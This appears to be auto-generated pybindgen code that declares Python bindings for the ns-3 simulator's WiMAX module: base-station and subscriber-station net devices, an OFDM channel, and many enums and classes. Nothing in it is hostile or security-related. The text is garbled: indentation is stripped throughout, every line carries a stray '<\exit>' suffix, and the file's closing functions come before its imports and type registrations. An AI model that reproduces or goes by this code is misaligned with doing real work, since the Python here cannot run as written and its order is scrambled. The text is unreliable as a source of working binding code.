is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv6Address', 'addr')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv4Address', 'multicastGroup')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsBridge',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsPromisc',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('NotifyPromiscTrace',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'p')])<\exit>
cls.add_method('DoSend',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoReceive',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetChannel',<\exit>
'ns3::Ptr< ns3::WimaxChannel >',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3AddressChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::AddressChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3AddressValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::AddressValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Address const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Address const &', 'value')])<\exit>
return<\exit>
def register_Ns3BaseStationNetDevice_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy'), param('ns3::Ptr< ns3::UplinkScheduler >', 'uplinkScheduler'), param('ns3::Ptr< ns3::BSScheduler >', 'bsScheduler')])<\exit>
cls.add_method('SetInitialRangingInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'initialRangInterval')])<\exit>
cls.add_method('InitBaseStationNetDevice',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('GetInitialRangingInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetDcdInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'dcdInterval')])<\exit>
cls.add_method('GetDcdInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetUcdInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'ucdInterval')])<\exit>
cls.add_method('GetUcdInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT8',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval')])<\exit>
cls.add_method('GetIntervalT8',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxRangingCorrectionRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxRangCorrectionRetries')])<\exit>
cls.add_method('GetMaxRangingCorrectionRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxInvitedRangRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxInvitedRangRetries')])<\exit>
cls.add_method('GetMaxInvitedRangRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetRangReqOppSize',<\exit>
'void',<\exit>
[param('uint8_t', 'rangReqOppSize')])<\exit>
cls.add_method('GetRangReqOppSize',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBwReqOppSize',<\exit>
'void',<\exit>
[param('uint8_t', 'bwReqOppSize')])<\exit>
cls.add_method('GetBwReqOppSize',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetNrDlSymbols',<\exit>
'void',<\exit>
[param('uint32_t', 'dlSymbols')])<\exit>
cls.add_method('GetNrDlSymbols',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetNrUlSymbols',<\exit>
'void',<\exit>
[param('uint32_t', 'ulSymbols')])<\exit>
cls.add_method('GetNrUlSymbols',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrDcdSent',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrUcdSent',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlSubframeStartTime',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUlSubframeStartTime',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingOppNumber',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSSManager',<\exit>
'ns3::Ptr< ns3::SSManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetSSManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SSManager >', 'ssManager')])<\exit>
cls.add_method('GetUplinkScheduler',<\exit>
'ns3::Ptr< ns3::UplinkScheduler >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetUplinkScheduler',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::UplinkScheduler >', 'ulScheduler')])<\exit>
cls.add_method('GetLinkManager',<\exit>
'ns3::Ptr< ns3::BSLinkManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBSScheduler',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BSScheduler >', 'bsSchedule')])<\exit>
cls.add_method('GetBSScheduler',<\exit>
'ns3::Ptr< ns3::BSScheduler >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetLinkManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BSLinkManager >', 'linkManager')])<\exit>
cls.add_method('GetBsClassifier',<\exit>
'ns3::Ptr< ns3::IpcsClassifier >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBsClassifier',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::IpcsClassifier >', 'classifier')])<\exit>
cls.add_method('GetPsDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSymbolDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Start',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('MarkUplinkAllocations',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('MarkRangingOppStart',<\exit>
'void',<\exit>
[param('ns3::Time', 'rangingOppStartTime')])<\exit>
cls.add_method('GetServiceFlowManager',<\exit>
'ns3::Ptr< ns3::BsServiceFlowManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetServiceFlowManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BsServiceFlowManager >', 'arg0')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSend',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoReceive',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet')],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3SimpleOfdmWimaxChannel_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SimpleOfdmWimaxChannel const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propModel')])<\exit>
cls.add_method('Send',<\exit>
'void',<\exit>
[param('ns3::Time', 'BlockTime'), param('uint32_t', 'burstSize'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy'), param('bool', 'isFirstBlock'), param('bool', 'isLastBlock'), param('uint64_t', 'frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('SetPropagationModel',<\exit>
'void',<\exit>
[param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propModel')])<\exit>
cls.add_method('DoAttach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3SubscriberStationNetDevice_methods(root_module, cls):<\exit>
cls.add_instance_attribute('m_linkManager', 'ns3::Ptr< ns3::SSLinkManager >', is_const=False)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'arg0'), param('ns3::Ptr< ns3::WimaxPhy >', 'arg1')])<\exit>
cls.add_method('InitSubscriberStationNetDevice',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetLostDlMapInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'lostDlMapInterval')])<\exit>
cls.add_method('GetLostDlMapInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetLostUlMapInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'lostUlMapInterval')])<\exit>
cls.add_method('GetLostUlMapInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxDcdInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'maxDcdInterval')])<\exit>
cls.add_method('GetMaxDcdInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxUcdInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'maxUcdInterval')])<\exit>
cls.add_method('GetMaxUcdInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT1',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval1')])<\exit>
cls.add_method('GetIntervalT1',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT2',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval2')])<\exit>
cls.add_method('GetIntervalT2',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT3',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval3')])<\exit>
cls.add_method('GetIntervalT3',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT7',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval7')])<\exit>
cls.add_method('GetIntervalT7',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT12',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval12')])<\exit>
cls.add_method('GetIntervalT12',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT20',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval20')])<\exit>
cls.add_method('GetIntervalT20',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT21',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval21')])<\exit>
cls.add_method('GetIntervalT21',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxContentionRangingRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxContentionRangingRetries')])<\exit>
cls.add_method('GetMaxContentionRangingRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBasicConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'basicConnection')])<\exit>
cls.add_method('GetBasicConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetPrimaryConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'primaryConnection')])<\exit>
cls.add_method('GetPrimaryConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBasicCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPrimaryCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetModulationType',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('GetModulationType',<\exit>
'ns3::WimaxPhy::ModulationType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetAreManagementConnectionsAllocated',<\exit>
'void',<\exit>
[param('bool', 'areManagementConnectionsAllocated')])<\exit>
cls.add_method('GetAreManagementConnectionsAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetAreServiceFlowsAllocated',<\exit>
'void',<\exit>
[param('bool', 'areServiceFlowsAllocated')])<\exit>
cls.add_method('GetAreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetScheduler',<\exit>
'ns3::Ptr< ns3::SSScheduler >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetScheduler',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SSScheduler >', 'ssScheduler')])<\exit>
cls.add_method('HasServiceFlows',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SendBurst',<\exit>
'void',<\exit>
[param('uint8_t', 'uiuc'), param('uint16_t', 'nrSymbols'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('ns3::MacHeaderType::HeaderType', 'packetType', default_value='::ns3::MacHeaderType::HEADER_TYPE_GENERIC')])<\exit>
cls.add_method('Start',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'sf')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('SetTimer',<\exit>
'void',<\exit>
[param('ns3::EventId', 'eventId'), param('ns3::EventId &', 'event')])<\exit>
cls.add_method('IsRegistered',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTimeToAllocation',<\exit>
'ns3::Time',<\exit>
[param('ns3::Time', 'defferTime')])<\exit>
cls.add_method('GetIpcsClassifier',<\exit>
'ns3::Ptr< ns3::IpcsClassifier >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIpcsPacketClassifier',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::IpcsClassifier >', 'arg0')])<\exit>
cls.add_method('GetLinkManager',<\exit>
'ns3::Ptr< ns3::SSLinkManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetLinkManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SSLinkManager >', 'arg0')])<\exit>
cls.add_method('GetServiceFlowManager',<\exit>
'ns3::Ptr< ns3::SsServiceFlowManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetServiceFlowManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SsServiceFlowManager >', 'arg0')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSend',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoReceive',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet')],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_functions(root_module):<\exit>
module = root_module<\exit>
module.add_function('CRC8Calculate',<\exit>
'uint8_t',<\exit>
[param('uint8_t const *', 'data'), param('int', 'length')])<\exit>
register_functions_ns3_FatalImpl(module.get_submodule('FatalImpl'), root_module)<\exit>
register_functions_ns3_internal(module.get_submodule('internal'), root_module)<\exit>
return<\exit>
def register_functions_ns3_FatalImpl(module, root_module):<\exit>
return<\exit>
def register_functions_ns3_internal(module, root_module):<\exit>
return<\exit>
def main():<\exit>
out = FileCodeSink(sys.stdout)<\exit>
root_module = module_init()<\exit>
register_types(root_module)<\exit>
register_methods(root_module)<\exit>
register_functions(root_module)<\exit>
root_module.generate(out)<\exit>
if __name__ == '__main__':<\exit>
main()<\exit>
from pybindgen import Module, FileCodeSink, param, retval, cppclass, typehandlers<\exit>
import pybindgen.settings<\exit>
import warnings<\exit>
class ErrorHandler(pybindgen.settings.ErrorHandler):<\exit>
def handle_error(self, wrapper, exception, traceback_):<\exit>
warnings.warn("exception %r in wrapper %s" % (exception, wrapper))<\exit>
return True<\exit>
pybindgen.settings.error_handler = ErrorHandler()<\exit>
import sys<\exit>
def module_init():<\exit>
root_module = Module('ns.wimax', cpp_namespace='::ns3')<\exit>
return root_module<\exit>
def register_types(module):<\exit>
root_module = module.get_root()<\exit>
module.add_enum('ReqType', ['DATA', 'UNICAST_POLLING'])<\exit>
module.add_enum('LogLevel', ['LOG_NONE', 'LOG_ERROR', 'LOG_LEVEL_ERROR', 'LOG_WARN', 'LOG_LEVEL_WARN', 'LOG_DEBUG', 'LOG_LEVEL_DEBUG', 'LOG_INFO', 'LOG_LEVEL_INFO', 'LOG_FUNCTION', 'LOG_LEVEL_FUNCTION', 'LOG_LOGIC', 'LOG_LEVEL_LOGIC', 'LOG_ALL', 'LOG_LEVEL_ALL', 'LOG_PREFIX_FUNC', 'LOG_PREFIX_TIME', 'LOG_PREFIX_NODE'], import_from_module='ns.core')<\exit>
module.add_class('Address', import_from_module='ns.network')<\exit>
module.add_enum('MaxSize_e', ['MAX_SIZE'], outer_class=root_module['ns3::Address'], import_from_module='ns.network')<\exit>
module.add_class('AsciiTraceHelper', import_from_module='ns.network')<\exit>
module.add_class('AsciiTraceHelperForDevice', allow_subclassing=True, import_from_module='ns.network')<\exit>
module.add_class('AttributeConstructionList', import_from_module='ns.core')<\exit>
module.add_class('Item', import_from_module='ns.core', outer_class=root_module['ns3::AttributeConstructionList'])<\exit>
module.add_class('Buffer', import_from_module='ns.network')<\exit>
module.add_class('Iterator', import_from_module='ns.network', outer_class=root_module['ns3::Buffer'])<\exit>
module.add_class('ByteTagIterator', import_from_module='ns.network')<\exit>
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagIterator'])<\exit>
module.add_class('ByteTagList', import_from_module='ns.network')<\exit>
module.add_class('Iterator', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagList'])<\exit>
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagList::Iterator'])<\exit>
module.add_class('CallbackBase', import_from_module='ns.core')<\exit>
module.add_class('Cid')<\exit>
module.add_enum('Type', ['BROADCAST', 'INITIAL_RANGING', 'BASIC', 'PRIMARY', 'TRANSPORT', 'MULTICAST', 'PADDING'], outer_class=root_module['ns3::Cid'])<\exit>
module.add_class('CidFactory')<\exit>
module.add_class('CsParameters')<\exit>
module.add_enum('Action', ['ADD', 'REPLACE', 'DELETE'], outer_class=root_module['ns3::CsParameters'])<\exit>
module.add_class('DcdChannelEncodings', allow_subclassing=True)<\exit>
module.add_class('DlFramePrefixIe')<\exit>
module.add_class('EventId', import_from_module='ns.core')<\exit>
module.add_class('IpcsClassifierRecord')<\exit>
module.add_class('Ipv4Address', import_from_module='ns.network')<\exit>
root_module['ns3::Ipv4Address'].implicitly_converts_to(root_module['ns3::Address'])<\exit>
module.add_class('Ipv4Mask', import_from_module='ns.network')<\exit>
module.add_class('Ipv6Address', import_from_module='ns.network')<\exit>
root_module['ns3::Ipv6Address'].implicitly_converts_to(root_module['ns3::Address'])<\exit>
module.add_class('Ipv6Prefix', import_from_module='ns.network')<\exit>
module.add_class('LogComponent', import_from_module='ns.core')<\exit>
module.add_class('Mac48Address', import_from_module='ns.network')<\exit>
root_module['ns3::Mac48Address'].implicitly_converts_to(root_module['ns3::Address'])<\exit>
module.add_class('NetDeviceContainer', import_from_module='ns.network')<\exit>
module.add_class('NodeContainer', import_from_module='ns.network')<\exit>
module.add_class('ObjectBase', allow_subclassing=True, import_from_module='ns.core')<\exit>
module.add_class('ObjectDeleter', import_from_module='ns.core')<\exit>
module.add_class('ObjectFactory', import_from_module='ns.core')<\exit>
module.add_class('OfdmDcdChannelEncodings', parent=root_module['ns3::DcdChannelEncodings'])<\exit>
module.add_class('OfdmDlBurstProfile')<\exit>
module.add_enum('Diuc', ['DIUC_STC_ZONE', 'DIUC_BURST_PROFILE_1', 'DIUC_BURST_PROFILE_2', 'DIUC_BURST_PROFILE_3', 'DIUC_BURST_PROFILE_4', 'DIUC_BURST_PROFILE_5', 'DIUC_BURST_PROFILE_6', 'DIUC_BURST_PROFILE_7', 'DIUC_BURST_PROFILE_8', 'DIUC_BURST_PROFILE_9', 'DIUC_BURST_PROFILE_10', 'DIUC_BURST_PROFILE_11', 'DIUC_GAP', 'DIUC_END_OF_MAP'], outer_class=root_module['ns3::OfdmDlBurstProfile'])<\exit>
module.add_class('OfdmDlMapIe')<\exit>
module.add_class('OfdmUlBurstProfile')<\exit>
module.add_enum('Uiuc', ['UIUC_INITIAL_RANGING', 'UIUC_REQ_REGION_FULL', 'UIUC_REQ_REGION_FOCUSED', 'UIUC_FOCUSED_CONTENTION_IE', 'UIUC_BURST_PROFILE_5', 'UIUC_BURST_PROFILE_6', 'UIUC_BURST_PROFILE_7', 'UIUC_BURST_PROFILE_8', 'UIUC_BURST_PROFILE_9', 'UIUC_BURST_PROFILE_10', 'UIUC_BURST_PROFILE_11', 'UIUC_BURST_PROFILE_12', 'UIUC_SUBCH_NETWORK_ENTRY', 'UIUC_END_OF_MAP'], outer_class=root_module['ns3::OfdmUlBurstProfile'])<\exit>
module.add_class('OfdmUlMapIe')<\exit>
module.add_class('PacketMetadata', import_from_module='ns.network')<\exit>
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::PacketMetadata'])<\exit>
module.add_enum('', ['PAYLOAD', 'HEADER', 'TRAILER'], outer_class=root_module['ns3::PacketMetadata::Item'], import_from_module='ns.network')<\exit>
module.add_class('ItemIterator', import_from_module='ns.network', outer_class=root_module['ns3::PacketMetadata'])<\exit>
module.add_class('PacketTagIterator', import_from_module='ns.network')<\exit>
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::PacketTagIterator'])<\exit>
module.add_class('PacketTagList', import_from_module='ns.network')<\exit>
module.add_class('TagData', import_from_module='ns.network', outer_class=root_module['ns3::PacketTagList'])<\exit>
module.add_class('PcapFile', import_from_module='ns.network')<\exit>
module.add_class('PcapHelper', import_from_module='ns.network')<\exit>
module.add_enum('', ['DLT_NULL', 'DLT_EN10MB', 'DLT_PPP', 'DLT_RAW', 'DLT_IEEE802_11', 'DLT_PRISM_HEADER', 'DLT_IEEE802_11_RADIO'], outer_class=root_module['ns3::PcapHelper'], import_from_module='ns.network')<\exit>
module.add_class('PcapHelperForDevice', allow_subclassing=True, import_from_module='ns.network')<\exit>
module.add_class('RandomVariable', import_from_module='ns.core')<\exit>
module.add_class('SNRToBlockErrorRateManager')<\exit>
module.add_class('SNRToBlockErrorRateRecord')<\exit>
module.add_class('SSRecord')<\exit>
module.add_class('SeedManager', import_from_module='ns.core')<\exit>
module.add_class('SendParams')<\exit>
module.add_class('SequentialVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('ServiceFlow')<\exit>
module.add_enum('Direction', ['SF_DIRECTION_DOWN', 'SF_DIRECTION_UP'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_enum('Type', ['SF_TYPE_PROVISIONED', 'SF_TYPE_ADMITTED', 'SF_TYPE_ACTIVE'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_enum('SchedulingType', ['SF_TYPE_NONE', 'SF_TYPE_UNDEF', 'SF_TYPE_BE', 'SF_TYPE_NRTPS', 'SF_TYPE_RTPS', 'SF_TYPE_UGS', 'SF_TYPE_ALL'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_enum('CsSpecification', ['ATM', 'IPV4', 'IPV6', 'ETHERNET', 'VLAN', 'IPV4_OVER_ETHERNET', 'IPV6_OVER_ETHERNET', 'IPV4_OVER_VLAN', 'IPV6_OVER_VLAN'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_enum('ModulationType', ['MODULATION_TYPE_BPSK_12', 'MODULATION_TYPE_QPSK_12', 'MODULATION_TYPE_QPSK_34', 'MODULATION_TYPE_QAM16_12', 'MODULATION_TYPE_QAM16_34', 'MODULATION_TYPE_QAM64_23', 'MODULATION_TYPE_QAM64_34'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_class('ServiceFlowRecord')<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::Object', 'ns3::ObjectBase', 'ns3::ObjectDeleter'], parent=root_module['ns3::ObjectBase'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('Simulator', destructor_visibility='private', import_from_module='ns.core')<\exit>
module.add_class('Tag', import_from_module='ns.network', parent=root_module['ns3::ObjectBase'])<\exit>
module.add_class('TagBuffer', import_from_module='ns.network')<\exit>
module.add_class('TlvValue', allow_subclassing=True)<\exit>
module.add_class('TosTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('TriangularVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('TypeId', import_from_module='ns.core')<\exit>
module.add_enum('AttributeFlag', ['ATTR_GET', 'ATTR_SET', 'ATTR_CONSTRUCT', 'ATTR_SGC'], outer_class=root_module['ns3::TypeId'], import_from_module='ns.core')<\exit>
module.add_class('AttributeInformation', import_from_module='ns.core', outer_class=root_module['ns3::TypeId'])<\exit>
module.add_class('TraceSourceInformation', import_from_module='ns.core', outer_class=root_module['ns3::TypeId'])<\exit>
module.add_class('U16TlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('U32TlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('U8TlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('UcdChannelEncodings', allow_subclassing=True)<\exit>
module.add_class('UniformVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('VectorTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('WeibullVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
